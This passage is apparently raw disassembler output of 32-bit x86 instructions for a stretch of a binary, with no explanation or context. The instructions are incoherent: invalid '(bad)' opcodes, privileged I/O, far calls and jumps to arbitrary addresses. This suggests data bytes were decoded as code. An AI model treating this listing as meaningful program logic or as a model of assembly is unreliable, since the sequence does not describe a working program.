  40d203:	scas   eax,DWORD PTR es:[edi]
  40d204:	jl     0x40d250
  40d206:	adc    ebp,eax
  40d208:	jge    0x40d219
  40d20a:	push   cs
  40d20b:	sbb    edx,DWORD PTR [ebx+0x53]
  40d20e:	adc    DWORD PTR [esi+0x2778f4c7],ebx
  40d214:	pusha  
  40d215:	add    esp,ebp
  40d217:	mov    eax,0x762e5084
  40d21c:	add    ecx,DWORD PTR [edi]
  40d21e:	jg     0x40d27d
  40d220:	test   BYTE PTR [edi-0x6a1f398],ah
  40d226:	xor    al,0xdf
  40d228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d229:	std    
  40d22a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22b:	push   ebx
  40d22c:	mov    bl,0x9c
  40d22e:	jmp    0xd9f1b15f
  40d233:	sbb    DWORD PTR [ecx],ebx
  40d235:	call   0x8609:0xffcebd58
  40d23c:	stos   DWORD PTR es:[edi],eax
  40d23d:	iret   
  40d23e:	inc    ebp
  40d23f:	in     eax,0x37
  40d241:	les    esp,FWORD PTR ds:0xe16ca70a
  40d247:	(bad)  
  40d248:	nop
  40d249:	mov    al,0x7d
  40d24b:	jle    0x40d1d6
  40d24d:	cli    
  40d24e:	cli    
  40d24f:	cs in  eax,dx
  40d251:	in     al,0xe1
  40d253:	outs   dx,DWORD PTR ds:[esi]
  40d254:	or     al,0xb0
  40d256:	data16 jne 0x40d227
  40d259:	call   DWORD PTR [ebx]
  40d25b:	and    eax,0x2d6e1310
  40d260:	jge    0x40d231
  40d262:	and    al,0xbf
  40d264:	add    ecx,DWORD PTR [esp+edi*8-0x5f]
  40d268:	pop    ss
  40d269:	fwait
  40d26a:	div    edi
  40d26c:	inc    esi
  40d26d:	jae    0x40d24d
  40d26f:	not    DWORD PTR [ebx]
  40d271:	adc    eax,0xc1749443
  40d276:	scas   al,BYTE PTR es:[edi]
  40d277:	scas   eax,DWORD PTR es:[edi]
  40d278:	inc    ecx
  40d279:	cmp    DWORD PTR [ebp+0x6e],0xbf11e717
  40d280:	dec    edx
  40d281:	cmovp  edx,DWORD PTR [ebp+ebx*4+0x36]
  40d286:	(bad)  
  40d287:	leave  
  40d288:	(bad)  
  40d289:	cmp    edi,DWORD PTR fs:[eax]
  40d28c:	jnp    0x40d298
  40d28e:	xchg   DWORD PTR [ecx+0x0],ecx
  40d291:	cmp    ecx,DWORD PTR [ebp+0x6072109]
  40d297:	lock aad 0xb1
  40d29a:	lahf   
  40d29b:	mov    ch,0x53
  40d29d:	dec    ebp
  40d29e:	loopne 0x40d296
  40d2a0:	and    eax,esp
  40d2a2:	into   
  40d2a3:	(bad)  
  40d2a4:	mov    eax,0x5ba2a5b7
  40d2a9:	or     eax,0x400b16eb
  40d2ae:	or     BYTE PTR [ebp+0x5c],ch
  40d2b1:	iret   
  40d2b2:	mov    al,0x4c
  40d2b4:	cld    
  40d2b5:	cmp    bh,BYTE PTR [ebx+ebp*4]
  40d2b8:	dec    edi
  40d2b9:	mov    dl,0x2
  40d2bb:	shl    DWORD PTR [edx+0x59],cl
  40d2be:	pop    esp
  40d2bf:	(bad)  
  40d2c0:	mov    ecx,0xd12e4fca
  40d2c5:	push   ebx
  40d2c6:	xor    bl,cl
  40d2c8:	fist   DWORD PTR [edi+0x19]
  40d2cb:	hlt    
  40d2cc:	jl     0x40d253
  40d2ce:	sbb    al,0xcd
  40d2d0:	hlt    
  40d2d1:	loope  0x40d2e3
  40d2d3:	sbb    al,0x12
  40d2d5:	sti    
  40d2d6:	sbb    BYTE PTR [edx+0x7e],bh
  40d2d9:	outs   dx,DWORD PTR ds:[esi]
  40d2da:	sub    eax,0xcafc79c1
  40d2df:	sbb    ecx,eax
  40d2e1:	fwait
  40d2e2:	jmp    WORD PTR ds:0x647f4fca
  40d2e9:	in     al,dx
  40d2ea:	jp     0x40d325
  40d2ec:	push   edx
  40d2ed:	jge    0x40d34e
  40d2ef:	cld    
  40d2f0:	xchg   edi,eax
  40d2f1:	add    dl,BYTE PTR [esi]
  40d2f3:	jmp    0x40d2e0
  40d2f5:	add    ebx,DWORD PTR [edx-0xcc33c00]
  40d2fb:	fcomi  st,st(5)
  40d2fd:	push   ss
  40d2fe:	pusha  
  40d2ff:	sub    dh,BYTE PTR [edi]
  40d301:	scas   al,BYTE PTR es:[edi]
  40d302:	and    al,0x7
  40d304:	cs cmp eax,0x2230712e
  40d30a:	mov    ah,0x9f
  40d30c:	jge    0x40d37e
  40d30e:	iret   
  40d30f:	retf   0x4f73
  40d312:	pop    ds
  40d313:	jb     0x40d317
  40d315:	mov    ds:0x7fd93a0,al
  40d31a:	or     BYTE PTR [ebx+ebx*1],bl
  40d31d:	mov    WORD PTR [edx-0x4f],cs
  40d320:	pop    ebp
  40d321:	sub    BYTE PTR [edx+0xa01778],0x6e
  40d328:	(bad)  
  40d329:	scas   al,BYTE PTR es:[edi]
  40d32a:	or     al,BYTE PTR [esi-0x308ce589]
  40d330:	mov    al,0x31
  40d332:	push   cs
  40d333:	call   0x13b5:0xfb8ce2ff
  40d33a:	adc    eax,0x24d01e8c
  40d33f:	js     0x40d370
  40d341:	push   esp
  40d342:	mov    ?,WORD PTR [eax-0x69]
  40d345:	call   0x7c9bc165
  40d34a:	dec    ebx
  40d34b:	jbe    0x40d311
  40d34d:	mov    edi,0xc6c9e164
  40d352:	sar    edx,cl
  40d354:	fidivr DWORD PTR [eax]
  40d356:	ss out dx,eax
  40d358:	push   eax
  40d359:	adc    eax,0x96ce9e0a
  40d35e:	aaa    
  40d35f:	sub    eax,0xe527514c
  40d364:	xchg   ecx,edx
  40d366:	add    BYTE PTR [edx-0xb0b8936],al
  40d36c:	out    0x3b,eax
  40d36e:	scas   al,BYTE PTR es:[edi]
  40d36f:	cdq    
  40d370:	fcmovnu st,st(4)
  40d372:	fwait
  40d373:	jmp    0x40d310
  40d375:	xchg   DWORD PTR [edi],esi
  40d377:	cmc    
  40d378:	xchg   esp,eax
  40d379:	add    al,0x19
  40d37b:	test   BYTE PTR ds:0x9bdd8158,ah
  40d381:	adc    ch,BYTE PTR [ebx-0xb1b6257]
  40d387:	inc    edx
  40d388:	mov    al,0xbf
  40d38a:	mov    cl,0x4f
  40d38c:	inc    sp
  40d38e:	mov    al,0x8c
  40d390:	in     al,0xd2
  40d392:	jnp    0x40d40a
  40d394:	add    eax,0x4bafe17f
  40d399:	mov    esp,0x4180a5ff
  40d39e:	in     al,0x7d
  40d3a0:	jo     0x40d3fe
  40d3a2:	inc    ebx
  40d3a3:	xchg   esp,eax
  40d3a4:	ja     0x40d416
  40d3a6:	sub    BYTE PTR [esi+0x6fa3fd6d],bl
  40d3ac:	and    ecx,esp
  40d3ae:	jmp    0x48d3f5eb
  40d3b3:	push   es
  40d3b4:	dec    ebp
  40d3b5:	enter  0xa773,0xf3
  40d3b9:	push   esp
  40d3ba:	into   
  40d3bb:	dec    eax
  40d3bc:	sbb    bl,BYTE PTR [edi+0x68]
  40d3bf:	not    bh
  40d3c1:	mov    ah,0x15
  40d3c3:	or     eax,0x81239c75
  40d3c8:	push   edx
  40d3c9:	les    eax,FWORD PTR [ebx+eax*1-0x75]
  40d3cd:	inc    esi
  40d3ce:	stos   BYTE PTR es:[edi],al
  40d3cf:	push   ss
  40d3d0:	sbb    al,0xd8
  40d3d2:	push   esp
  40d3d3:	jb     0x40d3a7
  40d3d5:	adc    BYTE PTR [ecx+0x78],dh
  40d3d8:	es ss test al,0xe9
  40d3dc:	test   BYTE PTR [ecx],bl
  40d3de:	neg    BYTE PTR [ecx+0x7a06a7ae]
  40d3e4:	cs jmp 0x3385eda8
  40d3ea:	punpckhdq mm2,QWORD PTR [edx]
  40d3ed:	movsx  edi,bl
  40d3f0:	es ins BYTE PTR es:[edi],dx
  40d3f2:	mov    dh,BYTE PTR ds:0xb82daeaf
  40d3f8:	(bad)  
  40d3f9:	jae    0x40d3c3
  40d3fb:	syscall 
  40d3fd:	dec    ecx
  40d3fe:	sti    
  40d3ff:	aam    0xc
  40d401:	add    eax,0xfaeae861
  40d406:	adc    al,0x70
  40d408:	clc    
  40d409:	push   ss
  40d40a:	sub    BYTE PTR [ebp-0x61],cl
  40d40d:	mov    ch,0xed
  40d40f:	xor    eax,0x221f27bf
  40d414:	mov    al,ds:0xc743d83
  40d419:	jb     0x40d477
  40d41b:	mov    cl,0xe1
  40d41d:	pop    edi
  40d41e:	icebp  
  40d41f:	clc    
  40d420:	xchg   ebx,eax
  40d421:	stos   DWORD PTR es:[edi],eax
  40d422:	mov    ebp,DWORD PTR [edx+ecx*2+0x680c87fd]
  40d429:	push   ebx
  40d42a:	rol    bh,1
  40d42c:	inc    ebx
  40d42d:	leave  
  40d42e:	cmp    bh,BYTE PTR [eax]
  40d430:	mov    ebp,0x4a18c02e
  40d435:	xchg   esp,eax
  40d436:	loopne 0x40d42d
  40d438:	int3   
  40d439:	and    al,BYTE PTR [ebx+0x1279cdd6]
  40d43f:	xchg   DWORD PTR [edi-0x74f88828],eax
  40d445:	xchg   ecx,eax
  40d446:	jp     0x40d4bc
  40d448:	arpl   WORD PTR [esi+edx*8],dx
  40d44b:	pop    esi
  40d44c:	popf   
  40d44d:	mov    dl,BYTE PTR [ecx-0x6bbd46c3]
  40d453:	aas    
  40d454:	jbe    0x40d411
  40d456:	or     eax,DWORD PTR [edx+0x7f]
  40d459:	(bad)  
  40d45a:	and    DWORD PTR [ebp+eiz*2+0x7],edi
  40d45e:	add    ch,BYTE PTR [esi-0x2467222d]
  40d464:	out    0xb7,al
  40d466:	jp     0x40d4b9
  40d468:	cmp    DWORD PTR [ecx],edx
  40d46a:	sti    
  40d46b:	(bad)  
  40d46c:	push   eax
  40d46d:	xchg   edx,eax
  40d46e:	outs   dx,BYTE PTR ds:[esi]
  40d46f:	adc    al,0xb6
  40d471:	jl     0x40d4d5
  40d473:	xor    DWORD PTR [esi],esi
  40d475:	outs   dx,BYTE PTR ds:[esi]
  40d476:	mov    ds:0x180f991f,eax
  40d47b:	mov    ds,ebx
  40d47d:	loopne 0x40d4e7
  40d47f:	pusha  
  40d480:	test   DWORD PTR [edx-0x6d],ecx
  40d483:	adc    eax,0xa5c9d02c
  40d488:	frstor [edx]
  40d48a:	dec    edi
  40d48b:	push   ebp
  40d48c:	sbb    al,0x4f
  40d48e:	mov    ds:0xd2a40d0e,al
  40d493:	pop    eax
  40d494:	sub    eax,DWORD PTR [esi+0x33c2a8f3]
  40d49a:	in     eax,dx
  40d49b:	dec    ecx
  40d49c:	stos   BYTE PTR es:[edi],al
  40d49d:	jnp    0x40d46a
  40d49f:	loope  0x40d4d6
  40d4a1:	ins    DWORD PTR es:[edi],dx
  40d4a2:	ins    DWORD PTR es:[edi],dx
  40d4a3:	sbb    eax,0x17158172
  40d4a8:	adc    al,0x2e
  40d4aa:	jb     0x40d4ba
  40d4ac:	cld    
  40d4ad:	push   0x28
  40d4af:	sahf   
  40d4b0:	inc    esp
  40d4b1:	mov    ecx,0x2dbad105
  40d4b6:	dec    edi
  40d4b7:	push   edx
  40d4b8:	mov    WORD PTR [edi+0x224609be],ds
  40d4be:	xchg   cl,dh
  40d4c0:	mov    ch,0x2f
  40d4c2:	leave  
  40d4c3:	push   es
  40d4c4:	and    bl,BYTE PTR ds:0xe990951f
  40d4ca:	or     al,0x26
  40d4cd:	ret    
  40d4ce:	mov    eax,ds:0x2edfae6f
  40d4d3:	std    
  40d4d4:	sti    
  40d4d5:	popf   
  40d4d6:	mov    eax,ds:0x517a622d
  40d4db:	(bad)  
  40d4dd:	fidiv  DWORD PTR [esi+0x7aea9a60]
  40d4e3:	(bad)  
  40d4e5:	hlt    
  40d4e6:	je     0x40d54e
  40d4e8:	or     DWORD PTR [edi*8+0x6c21b3ec],edx
  40d4ef:	mov    cl,BYTE PTR es:0x82af9150
  40d4f6:	xor    al,0xc
  40d4f8:	fcomi  st,st(7)
  40d4fa:	jmp    0x40d4e5
  40d4fc:	xor    DWORD PTR [esi+edi*1+0x4f],ebp
  40d500:	adc    esp,DWORD PTR [ebp-0xd]
  40d503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d504:	pusha  
  40d505:	dec    esp
  40d506:	sbb    bh,al
  40d508:	sub    DWORD PTR [ebx],ebx
  40d50a:	xor    BYTE PTR [eax-0x461392d3],al
  40d510:	aas    
  40d511:	repnz stos DWORD PTR es:[edi],eax
  40d513:	stc    
  40d514:	jne    0x40d4a8
  40d516:	jp     0x40d4fa
  40d518:	enter  0xeeca,0xdc
  40d51c:	loop   0x40d528
  40d51e:	(bad)  
  40d51f:	sahf   
  40d520:	xchg   esi,esi
  40d522:	cmp    edx,DWORD PTR [edi-0x1c]
  40d525:	mov    DWORD PTR [ebp-0x63],esp
  40d528:	xchg   esp,eax
  40d529:	add    eax,0xc93d02a
  40d52e:	sahf   
  40d52f:	dec    eax
  40d530:	les    ebx,FWORD PTR ss:[ebp-0x15]
  40d534:	mov    ecx,0xb15c0bb4
  40d539:	push   esi
  40d53a:	outs   dx,BYTE PTR ds:[esi]
  40d53b:	mov    al,cs:0xbb6affa9
  40d541:	dec    edx
  40d542:	jnp    0x40d54c
  40d544:	mov    WORD PTR [edx],?
  40d546:	or     BYTE PTR [ebp+0x6b],ah
  40d549:	mov    ebx,0x8ed003c1
  40d54e:	push   edi
  40d54f:	cs stos BYTE PTR es:[edi],al
  40d551:	outs   dx,BYTE PTR ds:[esi]
  40d552:	fucom  st(4)
  40d554:	sub    BYTE PTR [esi-0x18],0xf6
  40d558:	sbb    ch,BYTE PTR [edi]
  40d55a:	jg     0x40d570
  40d55c:	enter  0x69be,0x2a
  40d560:	shr    DWORD PTR ds:0xcf903841,cl
  40d566:	push   es
  40d567:	test   eax,0xddbb911f
  40d56c:	in     al,dx
  40d56d:	dec    esp
  40d56e:	xor    DWORD PTR [ebx],0x92e3261f
  40d574:	clc    
  40d575:	std    
  40d576:	xchg   edi,eax
  40d577:	jb     0x40d55d
  40d579:	or     al,0xa2
  40d57b:	lea    esi,fs:[ebp+0x4b3dcf84]
  40d582:	lock (bad) 
  40d584:	iret   
  40d585:	inc    esp
  40d586:	sbb    bl,BYTE PTR [edi]
  40d588:	pop    esp
  40d589:	mov    ds:0x8647194e,al
  40d58e:	mov    ebx,0x27db65b7
  40d593:	cmp    BYTE PTR [ebp-0x5990cb20],dh
  40d599:	lea    eax,[esi+0x492494c9]
  40d59f:	(bad)  
  40d5a0:	and    DWORD PTR [ebx-0x64],edx
  40d5a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5a4:	mov    dl,0x6e
  40d5a6:	(bad)  
  40d5a7:	fcom   QWORD PTR [ecx]
  40d5a9:	add    al,0xfe
  40d5ab:	push   edi
  40d5ac:	loop   0x40d573
  40d5ae:	data16 int 0xa8
  40d5b1:	stos   DWORD PTR es:[edi],eax
  40d5b2:	dec    ebx
  40d5b3:	aad    0xc5
  40d5b5:	add    DWORD PTR [ecx+0x24],esi
  40d5b8:	cdq    
  40d5b9:	popa   
  40d5ba:	dec    esi
  40d5bb:	pop    es
  40d5bc:	es stos DWORD PTR es:[edi],eax
  40d5be:	sub    DWORD PTR [edx-0x4092c97],ebp
  40d5c4:	mov    ch,0x15
  40d5c6:	and    eax,0x3bbab99d
  40d5cb:	and    al,0xf6
  40d5cd:	adc    BYTE PTR [edx+eax*1],cl
  40d5d0:	pop    eax
  40d5d1:	mov    ds:0x544bb248,al
  40d5d6:	pusha  
  40d5d7:	dec    edi
  40d5d8:	dec    edi
  40d5d9:	fimul  WORD PTR ds:[ebp-0x68]
  40d5dd:	xlat   BYTE PTR ds:[ebx]
  40d5de:	outs   dx,DWORD PTR ds:[esi]
  40d5df:	pop    ebx
  40d5e0:	jp     0x40d5ec
  40d5e2:	and    al,0xfa
  40d5e4:	adc    edi,0x4051de7c
  40d5ea:	aad    0xb9
  40d5ec:	mov    ebx,0xe24f8844
  40d5f1:	push   ecx
  40d5f2:	pop    ecx
  40d5f3:	imul   esi,DWORD PTR [edx+0x64d9e972],0x56328d9a
  40d5fd:	sbb    DWORD PTR [ecx+0x7a],esi
  40d600:	out    0xa7,al
  40d602:	cld    
  40d603:	bound  edx,QWORD PTR [ebx]
  40d605:	mov    dh,0x72
  40d607:	pop    edx
  40d608:	pop    ebp
  40d609:	mov    edi,DWORD PTR [eax-0x64]
  40d60c:	jno    0x40d5c2
  40d60e:	ja     0x40d5c2
  40d610:	ror    DWORD PTR [esi-0x71],cl
  40d613:	push   esi
  40d614:	sbb    BYTE PTR [edi+0x2342dd1f],dh
  40d61a:	sbb    al,0xf8
  40d61c:	fisttp DWORD PTR [eax-0x1f]
  40d61f:	adc    eax,0xf7bd041
  40d624:	mov    esp,0xed5a5ad2
  40d629:	push   ss
  40d62a:	(bad)  
  40d62c:	loop   0x40d602
  40d62e:	pusha  
  40d62f:	leave  
  40d630:	repz push 0xffffffce
  40d633:	test   al,0xf9
  40d635:	pop    esp
  40d636:	push   edi
  40d637:	jp     0x40d6a4
  40d639:	sbb    ecx,DWORD PTR [edx-0x17]
  40d63c:	int    0x76
  40d63e:	test   DWORD PTR [edx-0x59],edx
  40d641:	cld    
  40d642:	fcmovnbe st,st(1)
  40d644:	and    DWORD PTR [edi+0x39de5edc],esi
  40d64a:	int3   
  40d64b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d64c:	dec    edi
  40d64d:	inc    edi
  40d64e:	fild   QWORD PTR [esi]
  40d650:	mov    WORD PTR [ebx],fs
  40d652:	dec    eax
  40d653:	mov    cl,BYTE PTR [ebp-0x54314c60]
  40d659:	inc    ecx
  40d65a:	in     eax,0xf6
  40d65c:	lahf   
  40d65d:	mov    esi,0x7fe0ad65
  40d662:	sbb    BYTE PTR [esi-0xefd5b1f],al
  40d668:	outs   dx,BYTE PTR ds:[esi]
  40d669:	aam    0xfa
  40d66b:	sub    DWORD PTR [edi],ebx
  40d66d:	xor    cl,BYTE PTR [ebx+0x5d]
  40d670:	(bad)  
  40d671:	std    
  40d672:	dec    esp
  40d673:	xor    al,0x2f
  40d675:	inc    edx
  40d676:	xor    esi,DWORD PTR [edi+0x47]
  40d679:	xor    eax,0xdbe9bf84
  40d67e:	jnp    0x40d6e2
  40d680:	daa    
  40d681:	sbb    ecx,esp
  40d683:	imul   BYTE PTR [esi-0x1e]
  40d686:	add    cl,BYTE PTR [ebp+0x37]
  40d689:	test   DWORD PTR [esi+0x44c75c2e],ecx
  40d68f:	jmp    0x40d6a5
  40d691:	mov    ebx,0x434ab45
  40d696:	jmp    0xb4f718f4
  40d69b:	scas   al,BYTE PTR es:[edi]
  40d69c:	lea    esi,[edi]
  40d69e:	jbe    0x40d686
  40d6a0:	cmc    
  40d6a1:	adc    al,ch
  40d6a3:	les    ebp,FWORD PTR [edx-0x2be01873]
  40d6a9:	(bad)  
  40d6aa:	push   ebx
  40d6ab:	adc    al,0xae
  40d6ad:	mov    dh,0xe3
  40d6af:	test   al,0x9b
  40d6b1:	(bad)  [eax]
  40d6b3:	jb     0x40d6e3
  40d6b5:	inc    eax
  40d6b6:	shl    BYTE PTR [esi+0x3],1
  40d6b9:	add    DWORD PTR [ecx],0xffffffc8
  40d6bc:	dec    ebp
  40d6bd:	loop   0x40d6ef
  40d6bf:	push   ss
  40d6c0:	push   edi
  40d6c1:	int3   
  40d6c2:	fcom   st(5)
  40d6c4:	jp     0x40d6f9
  40d6c6:	rol    DWORD PTR [ebx],1
  40d6c8:	fwait
  40d6c9:	jnp    0x40d664
  40d6cb:	mov    ah,0x67
  40d6cd:	int    0x71
  40d6cf:	jmp    0x60120d36
  40d6d4:	enter  0x2773,0xc1
  40d6d8:	jmp    0x40d717
  40d6da:	sbb    BYTE PTR [edi-0x8],dl
  40d6dd:	int    0x88
  40d6df:	lahf   
  40d6e0:	sub    ebp,DWORD PTR [esi]
  40d6e2:	call   0x7c6d033c
  40d6e7:	icebp  
  40d6e8:	adc    esi,ebp
  40d6ea:	pop    esp
  40d6eb:	add    cl,BYTE PTR [ebx+ebx*4+0x1ea74756]
  40d6f2:	add    ebp,DWORD PTR [esi-0x19]
  40d6f5:	adc    esi,DWORD PTR [ecx+edx*8]
  40d6f8:	mov    edi,0xe55bf198
  40d6fd:	fs dec esp
  40d6ff:	aas    
  40d700:	mov    edx,0x20839d91
  40d705:	sub    BYTE PTR [ebp+0x35],0xce
  40d709:	aam    0x70
  40d70b:	dec    esi
  40d70c:	mov    eax,ds:0x7c6db0e1
  40d711:	(bad)  
  40d712:	out    dx,eax
  40d713:	mov    al,ds:0x5fbbfeb6
  40d718:	inc    esi
  40d719:	xchg   edi,eax
  40d71a:	sbb    DWORD PTR [eax+0x34],eax
  40d71d:	inc    esi
  40d71e:	mov    bl,0x59
  40d720:	jbe    0x40d721
  40d722:	ins    BYTE PTR es:[edi],dx
  40d723:	push   ebp
  40d724:	enter  0xa983,0xd2
  40d728:	addr16 add eax,0xcb59abfb
  40d72e:	imul   esp,DWORD PTR [ebx+0x3adf89ea],0xffffffd0
  40d735:	push   0xed83bb34
  40d73a:	call   FWORD PTR [si]
  40d73d:	inc    ebx
  40d73e:	cwde   
  40d73f:	hlt    
  40d740:	mov    DWORD PTR [ebp+0x6f845041],0x6febab7e
  40d74a:	out    0x91,eax
  40d74c:	cmp    BYTE PTR [ebx-0x63913cd8],ah
  40d752:	xchg   ebx,eax
  40d753:	jae    0x40d7c2
  40d755:	cmp    BYTE PTR [ecx+0x1c],cl
  40d758:	retf   
  40d759:	and    al,0x46
  40d75b:	lea    ebp,[eax+0x264d0f17]
  40d761:	je     0x40d7b4
  40d763:	(bad)  
  40d764:	cmp    dl,BYTE PTR cs:[edx-0x1d64804f]
  40d76b:	jbe    0x40d7e7
  40d76d:	hlt    
  40d76e:	fisub  WORD PTR [esi+0x56]
  40d771:	push   es
  40d772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d773:	ror    esi,cl
  40d775:	js     0x40d7f0
  40d777:	test   esi,esp
  40d779:	int    0xe1
  40d77b:	lea    esi,[esi+0x4eaa7f65]
  40d781:	mov    bh,0xd8
  40d783:	cli    
  40d784:	in     eax,dx
  40d785:	icebp  
  40d786:	fidiv  WORD PTR [ebp+eiz*1+0x5e1acceb]
  40d78d:	imul   DWORD PTR ds:[esi+eax*1-0x49]
  40d792:	add    eax,0xa937c583
  40d797:	pop    edi
  40d798:	inc    esi
  40d799:	or     al,0xd2
  40d79b:	stc    
  40d79c:	ins    BYTE PTR es:[edi],dx
  40d79d:	sbb    esi,esp
  40d79f:	xchg   ebx,eax
  40d7a0:	lds    edx,FWORD PTR [ebx+0x388ac4fa]
  40d7a6:	or     eax,eax
  40d7a8:	stos   DWORD PTR es:[edi],eax
  40d7a9:	ins    DWORD PTR es:[edi],dx
  40d7aa:	icebp  
  40d7ab:	inc    ecx
  40d7ac:	mov    al,ds:0x34eb928
  40d7b1:	std    
  40d7b2:	aam    0x41
  40d7b4:	push   esi
  40d7b5:	les    ebx,FWORD PTR [eax]
  40d7b7:	in     al,0x7f
  40d7b9:	adc    DWORD PTR [ebx-0xf],ecx
  40d7bc:	mov    ebp,0x1209f64a
  40d7c1:	pop    eax
  40d7c2:	dec    esp
  40d7c3:	mov    bh,ch
  40d7c5:	xchg   ebp,eax
  40d7c6:	mov    ecx,0x89c31e26
  40d7cb:	or     ebx,DWORD PTR [eax+0xb0fab2c]
  40d7d1:	aas    
  40d7d2:	xchg   DWORD PTR [esi-0x4e565f75],esp
  40d7d8:	gs stos BYTE PTR es:[edi],al
  40d7da:	test   eax,0xa920c4af
  40d7df:	scas   al,BYTE PTR es:[edi]
  40d7e0:	fucomp st(0)
  40d7e2:	test   eax,0xfdac4458
  40d7e7:	(bad)  
  40d7e8:	jmp    0x40d852
  40d7ea:	jo     0x40d770
  40d7ec:	aaa    
  40d7ed:	clc    
  40d7ee:	or     eax,0x1d3088ba
  40d7f3:	cmc    
  40d7f4:	out    dx,eax
  40d7f5:	mov    esp,0x7f9b59b7
  40d7fa:	pop    edi
  40d7fb:	ss aad 0xb1
  40d7fe:	mov    ds:0x61b57ede,eax
  40d803:	jmp    0x40d789
  40d805:	xchg   DWORD PTR gs:[eax+0x18],eax
  40d809:	loop   0x40d7ba
  40d80b:	push   edx
  40d80c:	pop    eax
  40d80d:	lods   al,BYTE PTR ds:[esi]
  40d80e:	ror    BYTE PTR [esi+0x13bd828c],1
  40d814:	mov    esp,ecx
  40d816:	xor    BYTE PTR [edx-0x583a56cb],ah
  40d81c:	addr16 sbb esp,esi
  40d81f:	push   ds
  40d820:	sbb    eax,0xc61545f8
  40d825:	sbb    eax,0x56c84ea7
  40d82a:	sbb    eax,0xdbd8d551
  40d82f:	fs (bad) 
  40d831:	and    DWORD PTR [eax+0x17],esi
  40d834:	(bad)  
  40d835:	mul    DWORD PTR [eax]
  40d837:	adc    ch,BYTE PTR [edi]
  40d839:	jns    0x40d857
  40d83b:	mov    ecx,0xb71aa2a2
  40d840:	cwde   
  40d841:	adc    edi,esp
  40d843:	cmp    al,0xaa
  40d845:	stc    
  40d846:	jl     0x40d881
  40d848:	xchg   BYTE PTR [ebp+0x58],ah
  40d84b:	(bad)  
  40d84d:	xlat   BYTE PTR ds:[ebx]
  40d84e:	pop    es
  40d84f:	mov    dh,dh
  40d851:	lock test DWORD PTR [ebx],ecx
  40d854:	mov    al,ds:0xda71ddd5
  40d859:	push   eax
  40d85a:	lea    esi,[ecx+edx*4+0x14fe3c68]
  40d861:	sbb    BYTE PTR [edx+edx*2+0x1a],al
  40d865:	adc    cl,dh
  40d867:	mov    ?,WORD PTR [edx-0x6a9374d1]
  40d86d:	xchg   DWORD PTR [ebx],eax
  40d86f:	idiv   eax
  40d871:	cmp    BYTE PTR [edx-0x7e4096ca],dl
  40d877:	mov    bl,0xfc
  40d879:	push   ebx
  40d87a:	iret   
  40d87b:	dec    edi
  40d87c:	mov    edx,gs
  40d87e:	adc    ebp,eax
  40d880:	push   ss
  40d881:	mov    edi,0xcacc74ba
  40d886:	pop    es
  40d887:	test   BYTE PTR [edx+eiz*8-0x17dd211c],0xd1
  40d88f:	js     0x40d866
  40d891:	push   edx
  40d892:	lods   eax,DWORD PTR ds:[esi]
  40d893:	push   ecx
  40d894:	icebp  
  40d895:	fidivr DWORD PTR [eax-0x14]
  40d898:	lea    ecx,[eax-0x2c]
  40d89b:	and    WORD PTR [esi-0x618294cf],0x9897
  40d8a4:	dec    eax
  40d8a5:	pop    DWORD PTR [ebp-0x7c]
  40d8a8:	daa    
  40d8a9:	and    BYTE PTR [ecx+0x58],ch
  40d8ac:	call   0xced0:0x87c0976
  40d8b3:	jg     0x40d92b
  40d8b5:	(bad)  
  40d8b7:	jge    0x40d86b
  40d8b9:	sbb    DWORD PTR [esi],edi
  40d8bb:	fsub   DWORD PTR ds:0x6bb66c72
  40d8c1:	inc    ecx
  40d8c2:	(bad)  [ebp-0x57]
  40d8c5:	lds    ecx,FWORD PTR ds:0x3eac1413
  40d8cb:	jns    0x40d859
  40d8cd:	mov    ds:0xecdd6fa2,al
  40d8d2:	sahf   
  40d8d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8d4:	call   0x2bdb:0xbf4cc064
  40d8db:	daa    
  40d8dc:	cmp    BYTE PTR [eax-0x4d],cl
  40d8df:	std    
  40d8e0:	mov    ss,ecx
  40d8e2:	ins    BYTE PTR es:[edi],dx
  40d8e3:	int    0x28
  40d8e5:	push   ecx
  40d8e6:	cdq    
  40d8e7:	fs inc eax
  40d8e9:	dec    ecx
  40d8ea:	rcr    DWORD PTR [edx],1
  40d8ec:	sub    ecx,esp
  40d8ee:	in     eax,0xeb
  40d8f0:	fsubr  st(1),st
  40d8f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8f3:	(bad)  
  40d8f5:	push   edi
  40d8f6:	pop    ebp
  40d8f7:	push   edx
  40d8f8:	into   
  40d8f9:	xchg   DWORD PTR [edx+0x1e],edx
  40d8fc:	push   cs
  40d8fd:	jbe    0x40d939
  40d8ff:	mov    al,0xe7
  40d901:	xor    al,0x81
  40d903:	xchg   ecx,eax
  40d904:	mov    ebx,0x8704f416
  40d909:	sub    eax,0xd18e7554
  40d90e:	or     eax,esi
  40d910:	test   al,0xc9
  40d912:	fcmovb st,st(6)
  40d914:	cmp    BYTE PTR [ecx-0x230691d8],cl
  40d91a:	pop    edx
  40d91b:	(bad)  
  40d91c:	xchg   ebp,eax
  40d91d:	cdq    
  40d91e:	(bad)  
  40d91f:	mov    edi,0xba23b9bf
  40d924:	mov    ebp,0x174511bd
  40d929:	out    dx,eax
  40d92a:	inc    ebx
  40d92b:	jg     0x40d98f
  40d92d:	mov    dh,0x71
  40d92f:	jge    0x40d949
  40d931:	fsubr  QWORD PTR [ebp+0x6251a5b2]
  40d937:	mov    ebp,0x67d9780f
  40d93c:	call   0xf401:0x82fb370
  40d943:	gs popa 
  40d945:	pop    es
  40d946:	xchg   edi,eax
  40d947:	pcmpeqw mm3,QWORD PTR [edx]
  40d94a:	xlat   BYTE PTR ds:[ebx]
  40d94b:	aas    
  40d94c:	les    ecx,FWORD PTR [edx-0x17]
  40d94f:	(bad)  
  40d950:	and    BYTE PTR [edi+0x2a],bh
  40d953:	mov    edx,0x8a8dde85
  40d958:	fwait
  40d959:	mov    ah,0x8d
  40d95b:	shr    ch,1
  40d95d:	add    al,0x7b
  40d95f:	and    DWORD PTR [esp+esi*8-0x10b6b5d9],edx
  40d966:	sub    dl,BYTE PTR ds:0x33dedcc2
  40d96c:	sub    eax,0x2cfd0691
  40d971:	mov    ds:0x4acae339,eax
  40d976:	inc    esi
  40d977:	retf   0x153d
